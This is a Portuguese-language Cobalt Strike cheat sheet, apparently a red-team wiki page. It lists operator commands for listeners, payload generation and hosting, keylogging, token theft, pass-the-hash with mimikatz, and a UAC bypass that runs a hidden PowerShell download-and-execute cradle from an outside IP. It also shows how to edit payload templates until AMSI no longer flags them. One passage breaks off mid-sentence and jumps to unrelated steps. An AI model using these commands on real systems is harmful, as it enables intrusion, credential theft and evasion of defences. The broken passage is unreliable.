# Cobalt Strike

### Listeners

### Ouvintes C2

`Cobalt Strike -> Listeners -> Add/Edit` e você pode selecionar onde ouvir, qual tipo de beacon usar (http, dns, smb...) e mais.

### Ouvintes Peer2Peer

Os beacons desses ouvintes não precisam se comunicar diretamente com o C2, eles podem se comunicar com ele por meio de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` e você precisa selecionar os beacons TCP ou SMB

* O **beacon TCP definirá um ouvinte na porta selecionada**. Para se conectar a um beacon TCP, use o comando `connect <ip> <port>` de outro beacon
* O **beacon smb ouvirá em um nome de pipe com o nome selecionado**. Para se conectar a um beacon SMB, você precisa usar o comando `link [target] [pipe]`.

### Gerar e hospedar payloads

#### Gerar payloads em arquivos

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do Office com uma macro
* **`Windows Executable`** para um .exe, .dll ou serviço .exe
* **`Windows Executable (S)`** para um **stageless** .exe, .dll ou serviço .exe (melhor stageless do que staged, menos IoCs)

#### Gerar e hospedar payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso gerará um script/executável para baixar o beacon do cobalt strike em formatos como: bitsadmin, exe, powershell e python

#### Hospedar payloads

Se você já tem o arquivo que deseja hospedar em um servidor web, basta ir para `Attacks -> Web Drive-by -> Host File` e selecionar o arquivo para hospedar e a configuração do servidor web.

### Opções do Beacon

<pre class="language-bash"><code class="lang-bash"># Executar binário .NET local
execute-assembly &#x3C;/path/to/executable.exe>

# Capturas de tela
printscreen    # Tirar uma única captura de tela via método PrintScr
screenshot     # Tirar uma única captura de tela
screenwatch    # Tirar capturas de tela periódicas da área de trabalho
## Vá para View -> Screenshots para vê-las

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes para ver as teclas pressionadas

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injetar ação de portscan dentro de outro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importar módulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;apenas escreva o comando powershell aqui>

# Impersonação de usuário
## Geração de token com credenciais
make_token [DOMAIN\user] [password] #Criar token para se passar por um usuário na rede
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token gerado com make_token
## O uso de make_token gera o evento 4624: Uma conta foi conectada com êxito. Este evento é muito comum em um domínio do Windows, mas pode ser reduzido filtrando o tipo de logon. Como mencionado acima, ele usa LOGON32_LOGON_NEW_CREDENTIALS que é o tipo 9.

# UAC Bypass
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Roubar token de pid
## Como make_token, mas roubando o token de um processo
steal_token [pid] # Além disso, isso é útil para ações de rede, não ações locais
## A partir da documentação da API, sabemos que esse tipo de logon "permite que o chamador clone seu token atual". É por isso que a saída do Beacon diz Impersonated &#x3C;current_username> - está se passando pelo nosso próprio token clonado.
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token de steal_token

## Iniciar processo com novas credenciais
spawnas [domain\username] [password] [listener] #Faça isso a partir de um diretório com acesso de leitura como: cd C:\
## Como make_token, isso gerará o evento do Windows 4624: Uma conta foi conectada com êxito, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Ele detalhará o usuário chamador (TargetUserName) e o usuário se passando (TargetOutboundUserName).

## Injetar em processo
inject [pid] [x64|x86] [listener]
## Do ponto de vista do OpSec: Não execute injeção entre plataformas, a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).

## Passar o hash
## Este processo de modificação requer a correção da memória LSASS, que é uma ação de alto risco, requer privilégios de administrador local e não é muito viável se o Protected Process Light (PPL) estiver habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Passar o hash através do mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Sem /run, mimikatz gera um cmd.exe,
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike para usar os recursos do disco que queremos e não os carregados.

### Kit de Recursos

A pasta ResourceKit contém os modelos para os payloads baseados em script do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os modelos, você pode descobrir o que o defensor (AMSI neste caso) não está gostando e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificar as linhas detectadas pode gerar um modelo que não será detectado.

Não se esqueça de carregar o script agressivo `ResourceKit\resources.cna` para indicar ao Cobalt Strike para usar os recursos do disco que queremos e não os carregados.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

